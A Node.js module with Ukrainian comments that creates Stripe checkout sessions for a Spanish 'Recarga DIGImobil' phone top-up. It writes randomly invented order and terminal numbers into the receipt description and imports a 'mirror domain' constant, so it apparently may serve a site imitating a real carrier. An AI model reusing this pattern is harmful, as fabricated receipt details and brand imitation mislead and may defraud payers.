const { STRIPE_SECRET_KEY, MIRROR_DOMAIN } = require('./constants');
const fetch = require('node-fetch');

// Глобальне сховище для даних платежів
global.paymentInfo = global.paymentInfo || {};

async function createStripeCheckoutSession(amount, phoneNumber, successUrl, cancelUrl, clientIP) {
  try {
    // КРИТИЧНО ВАЖЛИВО: Зберігаємо вхідний номер телефону в оригінальному вигляді
    console.log('Phone number received by createStripeCheckoutSession:', phoneNumber);
    
    const stripeUrl = 'https://api.stripe.com/v1/checkout/sessions';
    const priceInCents = Math.round(parseFloat(amount) * 100);
    const orderNumber = Math.floor(10000000 + Math.random() * 90000000).toString();
    const numberOfTerminal = Math.floor(856673 + Math.random() * 90000000).toString();

    // Просто використовуємо номер телефону як є, без будь-яких перевірок
    // УВАГА: Не використовуємо дефолтний номер, навіть якщо формат невірний
    // Видаляємо тільки нецифрові символи
    const cleanPhone = String(phoneNumber || '').replace(/\D/g, '');
    
    // Створюємо опис платежу
    const description = `Numero de telefono: ${cleanPhone}\nImporte: €${(priceInCents / 100).toFixed(2)}\nNumero de pedido: ${orderNumber}\nNumero de terminal: ${numberOfTerminal}`;
    console.log('Description for Stripe:', description);

    const params = new URLSearchParams();
    params.append('payment_method_types[]', 'card');
    params.append('mode', 'payment');
    params.append('success_url', successUrl + '?session_id={CHECKOUT_SESSION_ID}');
    params.append('cancel_url', cancelUrl);
    params.append('locale', 'es');
    params.append('client_reference_id', clientIP);

    params.append('line_items[0][quantity]', '1');
    params.append('line_items[0][price_data][currency]', 'eur');
    params.append('line_items[0][price_data][unit_amount]', priceInCents.toString());
    params.append('line_items[0][price_data][product_data][name]', 'Recarga DIGImobil');
    params.append('line_items[0][price_data][product_data][description]', description);

    console.log('Sending request to Stripe API...');
    
    const response = await fetch(stripeUrl, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${STRIPE_SECRET_KEY}`,
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: params.toString()
    });

    const responseText = await response.text();
    console.log('Stripe API response status:', response.status);
    
    if (!response.ok) {
      console.error('Stripe API error:', responseText);
      throw new Error(`Stripe API error: ${response.status} - ${responseText}`);
    }

    const session = JSON.parse(responseText);
    console.log('Stripe session created with ID:', session.id);

    // Зберігаємо дані платежу
    global.paymentInfo[session.id] = {
      phoneNumber: cleanPhone,  // Зберігаємо очищений номер
      terminal: numberOfTerminal,
      amount: priceInCents / 100,
      orderNumber: orderNumber
    };

    return { session };
  } catch (error) {
    console.error('Error in createStripeCheckoutSession:', error);
    throw error;
  }
}

module.exports = {
  createStripeCheckoutSession
};